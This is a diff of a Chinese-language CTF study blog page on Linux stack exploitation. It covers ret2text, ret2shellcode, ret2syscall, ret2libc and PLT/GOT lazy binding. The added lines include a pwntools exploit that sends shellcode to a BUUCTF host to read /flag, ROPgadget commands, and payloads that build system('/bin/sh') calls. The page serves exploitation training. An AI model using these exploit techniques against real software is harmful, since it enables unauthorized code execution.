class="number">100</span>)</span><br><span class="line">                                       </span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<li>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28718</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;orw&#x27;</span>)</span><br><span class="line">                                          </span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line"><span class="comment"># shellcode += shellcraft.read(3,&#x27;esp&#x27;,100)</span></span><br><span class="line"><span class="comment"># shellcode += shellcraft.write(1,&#x27;esp&#x27;,100)</span></span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="number">0x0804A060</span>+<span class="number">0x100</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="number">0x0804A060</span>+<span class="number">0x100</span>,<span class="number">100</span>)</span><br><span class="line">                                          </span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
 </blockquote>
 </li>
-<li><p>资源：<a target="_blank" rel="noopener" href="https://publicki.top/syscall.html">Chromium OS Docs - Linux System Call Table</a></p>
+<li>
+<p>资源：<a target="_blank" rel="noopener" href="https://publicki.top/syscall.html">Chromium OS Docs - Linux System Call Table</a></p>
 </li>
 </ul>
-<h1 id="栈溢出基础"><a href="#栈溢出基础" class="headerlink" title="栈溢出基础"></a>栈溢出基础</h1><p>函数调用过程中栈帧的变化可以参考另外一篇博客：<a href="https://leo021017.github.io/course/Assembly/汇编/">汇编语言程序设计（by fzy）笔记</a></p>
+<h1>pwntools使用</h1>
+<p><strong>pwntools</strong>中可以直接定义一个<code>ELF</code>对象，使用<code>search</code>方法可以获得字符串的地址，由于返回结果是一个生成器，使用<code>next</code>函数得到第一个结果，然后使用<code>hex</code>方法转成十六进制地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; elf = ELF(<span class="string">&quot;rop&quot;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/home/leo/Desktop/tmp/rop&#x27;</span></span><br><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">&gt;&gt;&gt; elf.search(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">&lt;generator object ELF.search at 0x7f0aaf3096d0&gt;</span><br><span class="line">&gt;&gt;&gt; hex(next(elf.search(b<span class="string">&quot;/bin/sh&quot;</span>)))</span><br><span class="line"><span class="string">&#x27;0x80be408&#x27;</span></span><br></pre></td></tr></table></figure>
+<h1>pwndgb使用</h1>
+<ul>
+<li><code>vmmap</code>：查看当前虚拟内存情况</li>
+<li><code>stack n</code>：查看当前栈帧，n表示打印内存区域的个数</li>
+<li><code>got</code>：查看GOT表项，一般x86 32位下，以 80 开头的地址是程序本身的地址，以 f7 开头的地址是libc的地址</li>
+</ul>
+<h1>栈溢出基础</h1>
+<p>函数调用过程中栈帧的变化可以参考另外一篇博客：<a href="https://leo021017.github.io/course/Assembly/%E6%B1%87%E7%BC%96/">汇编语言程序设计（by fzy）笔记</a></p>
 <p>这里的实例程序参考<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall">基本 ROP - CTF Wiki</a></p>
-<h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>最简单的一种题型，漏洞程序中已经写有存在后门的语句，只需跳转到该语句即可，即控制程序执行程序本身已有的代码 (.text)</p>
+<h1>几种保护措施</h1>
+<h2 id="NX">NX</h2>
+<p>NX（DEP）的基本原理是将数据所在内存页标识为不可执行</p>
+<h2 id="Canary">Canary</h2>
+<h1>基本ROP</h1>
+<h2 id="ret2text">ret2text</h2>
+<p>最简单的一种题型，漏洞程序中已经写有存在后门的语句，只需跳转到该语句即可，即控制程序执行程序本身已有的代码 (.text)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; For Example</span><br><span class="line">.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;&#x2F;bin&#x2F;sh&quot;</span><br></pre></td></tr></table></figure>
-<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>由于目前大部分的栈都默认开启了地址随机化——<strong>ALSR</strong>（Address Space Layout Randomization），或者如果开启<strong>NX</strong>（将内存中某些区域标记为不可执行）保护措施，栈缓冲区将不可执行，所以将shellcode注入到栈上就没有了意义，常用手段变为向 <strong>bss 缓冲区</strong>写入 shellcode 或向<strong>堆缓冲区</strong>写入 shellcode 并使用 mprotect 赋予其可执行权限</p>
+<h2 id="ret2shellcode">ret2shellcode</h2>
+<p>要求<code>checksec</code>后有<strong>可读可写可执行的段</strong>（segment）</p>
+<p>由于目前大部分的栈都默认开启了地址随机化——<strong>ALSR</strong>（Address Space Layout Randomization），或者如果开启<strong>NX</strong>（将内存中某些区域标记为不可执行）保护措施，栈缓冲区将不可执行，所以将shellcode注入到栈上就没有了意义，常用手段变为向 <strong>bss 缓冲区</strong>写入 shellcode 或向<strong>堆缓冲区</strong>写入 shellcode 并使用 mprotect 赋予其可执行权限</p>
 <blockquote>
 <p>/proc/sys/kernel/randomize_va_space = 0：没有随机化。即关闭 ASLR</p>
 <p>/proc/sys/kernel/randomize_va_space = 1：保留的随机化。共享库、栈、mmap() 以及 VDSO 将被随机化</p>
 <p>/proc/sys/kernel/randomize_va_space = 2：完全的随机化。在randomize_va_space = 1的基础上，通过 brk() 分配的内存空间也将被随机化</p>
 </blockquote>
-<p>​        在gdb中调试程序时，gdb是把程序放在了自己的一个沙盒环境中进行的，所以gdb中的绝对地址和实际地址可能不同（可以在程序        中使用<code>printf</code>打印地址证明），但地址相对的偏移是对的，而且在gdb中默认关闭了ASLR，即使在物理机中开启了ASLR</p>
-<p>​        这里可能是因为编译器的环境问题，我的<code>.bss</code>段是不可执行的，所以exp没有打通</p>
-<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>经常是<strong>静态链接</strong>的程序会用到，因为gadget足够多</p>
-<p>在栈中填入找到的gadget的地址，然后不断地跳转、返回，从而控制整个程序执行流，所以找到的gadget一般是以<code>ret</code>结尾的</p>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231104151724570.png" alt="image-20231104151724570" style="zoom:25%;" /></p>
+<p>在gdb中调试程序时，gdb是把程序放在了自己的一个沙盒环境中进行的，所以gdb中的绝对地址和实际地址可能不同（可以在程序中使用<code>printf</code>打印地址证明），但地址相对的偏移是对的，而且在gdb中默认关闭了ASLR，即使在物理机中开启了ASLR</p>
+<p>CTF Wiki 中的示例题目是将读入栈的一片缓存区使用<code>strncpy</code>函数复制到<code>.bss</code>段上的一个变量中，但可能是因为编译器的环境问题，我的<code>.bss</code>段是不可执行的，所以exp没有打通</p>
+<h2 id="ret2syscall">ret2syscall</h2>
+<p>经常是<strong>静态链接</strong>的程序会用到，因为gadget足够多，动态链接使用<code>ret2libc</code></p>
 <p>程序调用系统调用的过程是<code>eax</code>保存要调用的系统调用的调用号，<code>ebx</code>、<code>ecx</code>和<code>edx</code>分别保存需要的参数，这些操作通过<code>mov</code>指令执行，最后<code>int 0x80</code>触发请求调用系统调用的中断号，这就是整个过程</p>
+<p>如果我们要拿到<strong>shell</strong>，应该：</p>
 <ul>
-<li><p>动态链接库：使用<code>ldd</code>命令可以查看ELF文件使用了哪些动态链接库，<code>linux-gate.so.1</code>在高级pwn中会用到，<code>/lib/ld-linux.so.2</code>是动态链接器，一般没有漏洞，需要着重关心的是<code>libc.so.6</code>，这是一个软链接，指向操作系统使用的动态链接库版本，因为动态链接库会不断更新版本，因此为了不写死版本号，采用了这种<strong>软链接</strong>的方式</p>
+<li>系统调用号，即 eax 应该为 0xb</li>
+<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<p>那么我们该如何控制这些寄存器的值呢？这里就需要使用 <strong>gadgets</strong></p>
+<blockquote>
+<p>可以把 gadgets 理解成一个个代码片段，因为我们没有一段连续的代码来执行系统调用的操作（即后门函数），那我们就使用一个个片段组成一个完整的后门函数，gadgets 是一条汇编语句</p>
+</blockquote>
+<p>在栈中填入找到的gadget的地址，然后不断地跳转、返回，从而控制整个程序执行流，所以找到的gadget一般是以<code>ret</code>结尾的</p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231104151724570.png" alt="image-20231104151724570" style="zoom:25%;" />
+<blockquote>
+<p>一般使用 <strong>ROPgadget</strong> 查找gadgets，基本用法如下</p>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ROPgadget</span> <span class="built_in">--binary</span> <span class="string">rop</span>  <span class="built_in">--only</span> <span class="string">&#x27;pop|ret&#x27;</span> | <span class="string">grep</span> <span class="string">&#x27;eax&#x27;</span></span><br><span class="line"><span class="string">ret2syscall</span> <span class="string">ROPgadget</span> <span class="built_in">--binary</span> <span class="string">rop</span>  <span class="built_in">--only</span> <span class="string">&#x27;int&#x27;</span> </span><br></pre></td></tr></table></figure>
+<p>当然也可以查找字符串的地址</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --<span class="built_in">binary</span> rop  --<span class="built_in">string</span> <span class="string">&#x27;/bin/sh&#x27;</span> </span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="ret2libc">ret2libc</h2>
+<p><code>ret2libc</code>即控制函数执行 libc 中的函数，通常是返回至某个函数的 plt 表项处或者函数的具体位置 (即函数对应的 got 表项的内容)，一般情况下，我们会选择执行 <code>system(&quot;/bin/sh&quot;)</code>，故而此时我们需要知道 <code>system</code> 函数的地址</p>
+<p>由于子函数（如<code>system</code>函数）自己会把<code>ebp</code>压入栈中，所以我们在构造payload时不需要加上<code>ebp</code>，通常把返回地址以下（不包含返回地址）的部分认为是子函数栈帧部分</p>
+<blockquote>
+<p>动态链接库：使用<code>ldd</code>命令可以查看ELF文件使用了哪些动态链接库，<code>linux-gate.so.1</code>在高级pwn中会用到，<code>/lib/ld-linux.so.2</code>是动态链接器，一般没有漏洞，需要着重关心的是<code>libc.so.6</code>，这是一个软链接，指向操作系统使用的动态链接库版本，因为动态链接库会不断更新版本，因此为了不写死版本号，采用了这种<strong>软链接</strong>的方式</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ~/Desktop/tmp-16:48 &gt;&gt;&gt; ldd ciscn_s_9</span><br><span class="line">        linux-gate.so.1 (0xf7f2e000)</span><br><span class="line">        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d23000)</span><br><span class="line">        /lib/ld-linux.so.2 (0xf7f30000)</span><br></pre></td></tr></table></figure>
 <p>下面说明了实际指向<code>libc-2.31.so</code>这个文件</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ~/Desktop/tmp-16:48 &gt;&gt;&gt; file /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6: symbolic link to libc-2.31.so</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>CTF Wiki给出了三个例题</p>
+<ol>
+<li>
+<p>ret2libc1：程序给出了<code>system</code>的plt和字符串<code>/bin/sh</code>，直接构造payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>ret2libc2：只给了<code>system</code>的plt，自己传入<code>/bin/sh</code>字符串，需要两个 gadgets，第一个控制程序读取字符串（可以使用<code>gets</code>函数的plt），第二个控制程序执行 <code>system(&quot;/bin/sh&quot;)</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="number">0xdeadbeef</span>, buf2])</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>ret2libc3：<code>system</code>的plt和字符串<code>/bin/sh</code>都没有给，由于延迟绑定机制，如果程序中没有调用到<code>system</code>函数，就不会有<code>system</code>函数的plt表项，那就只能找到<code>system</code>函数在<strong>libc中的真实地址</strong></p>
+<p>首先使用一些方法泄露其他函数的GOT表项的地址（即Libc中该函数的地址），然后再泄露远程主机的Libc版本（比如LibcSearcher），就可以通过偏移量计算出远程主机所使用的Libc下<code>system</code>函数的地址</p>
+</li>
+</ol>
+<ul>
+<li>
+<p>如何泄露Libc版本</p>
+<p>由于Linux下页的大小是4kb，即4096个bit，所以一个地址的末三位是在一个内存页中的偏移值，即使开启ASLR，随机化后的地址的末三位也不会发生变化</p>
 </li>
 </ul>
-<blockquote>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;&gt; elf = ELF(&quot;rop&quot;)</span><br><span class="line">&gt;[*] <span class="string">&#x27;/home/leo/Desktop/tmp/rop&#x27;</span></span><br><span class="line">   Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">   RELRO:    Partial RELRO</span><br><span class="line">   Stack:    <span class="keyword">No</span> canary <span class="built_in">found</span></span><br><span class="line">   NX:       NX enabled</span><br><span class="line">   PIE:      <span class="keyword">No</span> PIE (<span class="number">0x8048000</span>)</span><br><span class="line">&gt;&gt;&gt;&gt; elf.<span class="keyword">search</span>(&quot;/bin/sh&quot;)</span><br><span class="line">&gt;&lt;generator <span class="keyword">object</span> ELF.<span class="keyword">search</span> at <span class="number">0x7f0aaf3096d0</span>&gt;</span><br><span class="line">&gt;&gt;&gt;&gt; hex(next(elf.<span class="keyword">search</span>(b&quot;/bin/sh&quot;)))</span><br><span class="line">&gt;<span class="string">&#x27;0x80be408&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>pwntools中可以直接定义一个ELF对象，使用<code>search</code>方法可以获得字符串的地址，由于返回结果是一个生成器，使用<code>next</code>函数得到第一个结果，然后使用<code>hex</code>方法转成十六进制地址</p>
-</blockquote>
-<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>由于子函数（如<code>system</code>函数）自己会把<code>ebp</code>压入栈中，所以我们在构造payload时不需要加上<code>ebp</code>，通常把返回地址以下（不包含返回地址）的部分认为是子函数栈帧部分</p>
-<h2 id="PLT和GOT"><a href="#PLT和GOT" class="headerlink" title="PLT和GOT"></a>PLT和GOT</h2><p>参考博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/linyt/article/details/51635768">聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT_plt got-CSDN博客</a></p>
+<h2 id="PLT和GOT">PLT和GOT</h2>
+<p>参考博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/linyt/article/details/51635768">聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT_plt got-CSDN博客</a></p>
 <p>以下面的代码为例：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_banner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to World of PLT and GOT\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    print_banner();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>使用<code>gcc -Wall -g -o test.o -c test.c -m32</code>和<code>gcc -o test test.o -m32</code>编译</p>
@@ -616,23 +729,22 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21:   e8 fc ff ff ff          call   22 &lt;print_banner+0x22&gt;</span><br></pre></td></tr></table></figure>
 <p><code>print_banner</code>函数调用了<code>printf</code>函数，由于程序采用的是动态链接，此时<code>printf</code>函数的地址还不知道，就先用<code>fc ff ff ff</code>代替</p>
 <p>现在有个问题，<code>call printf</code>部分写在了<code>.text</code>段，这部分是不能修改的，那怎么才能修改成真正的<code>printf</code>函数的地址呢？</p>
-<p>我们可以让<code>call printf</code>跳转到一段代码，这段代码可以获取到真正的<code>printf</code>函数的地址，那么我们现在就需要两个东西，一个是负责获取<code>printf</code>函数地址的代码（<code>printf_stub()</code>），一个是存储<code>printf</code>函数地址的数据段（<code>.data</code>），修改数据段中的地址即可让<code>printf_stub</code>重定向到不同的地址</p>
+<p>我们可以让<code>call printf</code>跳转到一段代码，这段代码可以获取到真正的<code>printf</code>函数的地址，那么我们现在就需要两个东西，一个是负责获取<code>printf</code>函数地址的代码（<code>printf_stub() </code>），一个是存储<code>printf</code>函数地址的数据段（<code>.data</code>），修改数据段中的地址即可让<code>printf_stub</code>重定向到不同的地址</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line">printf_stub:	&#x2F;&#x2F; 只需对printf_stub()进行重定位即可</span><br><span class="line">    mov rax, [printf函数的储存地址] &#x2F;&#x2F; 获取printf重定位之后的地址</span><br><span class="line">    jmp rax &#x2F;&#x2F; 跳过去执行printf函数</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的储存地址,这里储存printf函数重定位后的地址</span><br></pre></td></tr></table></figure>
-<p>对应有两个表，一个用来存放外部的函数和变量地址的数据表称为<strong>全局偏移表</strong>（<strong>GOT</strong>, Global Offset Table），那个存放额外代码的表称为<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure Link Table）</p>
+<p>对应有两个表，一个用来存放外部的函数和变量地址的数据表称为<strong>全局偏移表</strong>（<strong>GOT</strong>, Global Offset Table），那个存放额外代码的表称为<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure Link Table），PLT是地址的填写者，GOT是地址的保存者</p>
 <blockquote>
-<p>.got存变量地址；.gpt.plt存函数地址</p>
+<p>.got存变量地址；.got.plt存函数地址</p>
 </blockquote>
 <p>通过修改GOT就可以使用PLT跳转到不同的地址，可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址</p>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231104164442288.png" alt="image-20231104164442288" style="zoom: 40%;" /></p>
-<p>但是将动态链接库中的所有函数的地址全部都填入GOT不太现实，为了减小开销，Linux引入了<strong>延迟绑定机制</strong></p>
-<p>只有当某个函数被调用时才会进行地址解析和重定位工作，实现的伪代码如下</p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231104164442288.png" alt="image-20231104164442288" style="zoom: 40%;" />
+<p>但是将动态链接库中的所有函数的地址全部都填入GOT不太现实，为了减小开销，Linux引入了<strong>延迟绑定机制</strong>，只有当某个函数被调用时才会进行地址解析和重定位工作，实现的伪代码如下</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一开始没有重定位的时候将jmp printf@got的地址填成lookup_printf的地址</span></span><br><span class="line"><span class="keyword">void</span> <span class="built_in">printf</span>@plt()</span><br><span class="line">&#123;</span><br><span class="line">    address_good:</span><br><span class="line">        jmp *<span class="built_in">printf</span>@got   </span><br><span class="line">    lookup_printf:</span><br><span class="line">        <span class="comment">// 调用重定位函数查找 printf 地址，并写到 printf@got</span></span><br><span class="line">        <span class="keyword">goto</span> address_good;<span class="comment">//再返回去执行address_good</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>由于<code>printf@got</code>的地址一开始是<code>lookup_printf</code>的地址，所以第一次调用时，<code>printf@plt</code>函数会先跳转到<code>lookup_printf</code>函数，找到<code>printf</code>函数的地址并写入<code>printf@got</code>，之后在再执行<code>printf@plt</code>函数的时候就会通过<code>printf@got</code>直接跳到<code>printf</code>函数执行了</p>
 <p>那么<code>lookup_printf</code>函数具体是如何找到<code>printf</code>函数的地址的呢？</p>
 <p>使用 <code>objdump -d test &gt; test.asm</code> 命令可以看到PLT表项有三条指令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">080482d0 &lt;common@plt&gt;:</span><br><span class="line"> 80482d0:	ff 35 04 a0 04 08    	pushl  0x804a004</span><br><span class="line"> 80482d6:	ff 25 08 a0 04 08    	jmp    *0x804a008</span><br><span class="line"> 80482dc:	00 00                	add    %al,(%eax)</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">080482e0 &lt;puts@plt&gt;:</span><br><span class="line"> 80482e0:	ff 25 0c a0 04 08    	jmp    *0x804a00c</span><br><span class="line"> 80482e6:	68 00 00 00 00       	push   $0x0</span><br><span class="line"> 80482eb:	e9 e0 ff ff ff       	jmp    80482d0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line">080482f0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80482f0:	ff 25 10 a0 04 08    	jmp    *0x804a010</span><br><span class="line"> 80482f6:	68 08 00 00 00       	push   $0x8</span><br><span class="line"> 80482fb:	e9 d0 ff ff ff       	jmp    80482d0 &lt;_init+0x28&gt;</span><br></pre></td></tr></table></figure>
 <p>第一个表项是公用表项，是动态链接做符号解析和重定位（找函数地址）的公共入口，这也是Linux代码重用的思想</p>
-<p>其余表项的第一条指令都是跳转到对应的GOT表项，但我们知道在函数第一次调用前，GOT表项不是真正的地址，这里填成了对应plt中jmp的下一条指令<code>push    $0x0</code>，将数据压到栈上作为参数后就jmp到了第一个公用表项去找<code>printf</code>函数的地址，接下来jmp的地址是位于动态链接器内的函数<code>_dl_runtime_resolve</code>的地址，开始去找地址</p>
+<p>其余表项的第一条指令都是跳转到对应的GOT表项，但我们知道在函数第一次调用前，GOT表项不是真正的地址，这里填成了对应plt中jmp的下一条指令<code>push	$0x0</code>，将数据压到栈上作为参数后就jmp到了第一个公用表项去找<code>printf</code>函数的地址，接下来jmp的地址是位于动态链接器内的函数<code>_dl_runtime_resolve</code>的地址，开始去找地址</p>
 <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="variable">@plt</span> -&gt; xxx<span class="variable">@got</span> -&gt; xxx<span class="variable">@plt</span> -&gt; 公共<span class="variable">@plt</span> -&gt; _dl_runtime_resolve</span><br></pre></td></tr></table></figure>
 <p>其中每个xxx@plt的第二条指令push的操作数都是不一样的，它就相当于函数的<strong>id</strong>，动态链接器通过它就可以知道是要解析哪个函数了，这个值就是对应函数在.rel.plt 段的偏移量</p>
 <blockquote>
@@ -649,11 +761,13 @@
 <li>got[2]：<strong>_dl_runtime_resolve</strong>函数的地址（装载器中用于解析动态链接库中函数的实际地址的函数）</li>
 </ol>
 <ul>
-<li><p>第一次调用：</p>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231104174820709.png" alt="image-20231104174820709" style="zoom:33%;" /></p>
+<li>
+<p>第一次调用：</p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231104174820709.png" alt="image-20231104174820709" style="zoom:33%;" />
 </li>
-<li><p>第二次调用：</p>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231104174913736.png" alt="image-20231104174913736" style="zoom:33%;" /></p>
+<li>
+<p>第二次调用：</p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231104174913736.png" alt="image-20231104174913736" style="zoom:33%;" />
 </li>
 </ul>
 
@@ -661,6 +775,10 @@
         <hr>
         <!-- Pager -->
         <ul class="pager">
+          
+          <li class="previous">
+            <a href="/Lab/BUUCTF/pwn-wp/" data-toggle="tooltip" data-placement="top" title="BUUCTF PWN Write up">&larr; Previous Post</a>
+          </li>
           
           
           <li class="next">
@@ -758,7 +876,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">二进制基础</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E8%AF%91%E4%B8%8E%E9%93%BE%E6%8E%A5"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">程序的编译与链接</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Linux%E4%B8%8B%E7%9A%84%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8FELF"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">Linux下的可执行文件格式ELF</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%BF%9B%E7%A8%8B%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">进程虚拟地址空间</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A3%85%E8%BD%BD%E4%B8%8E%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%89%A7%E8%A1%8C"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">程序的装载与进程的执行</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#shellcode%E7%BC%96%E5%86%99"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">shellcode编写</span></a></li><li class="toc-nav-item toc-nav-level-1"><a 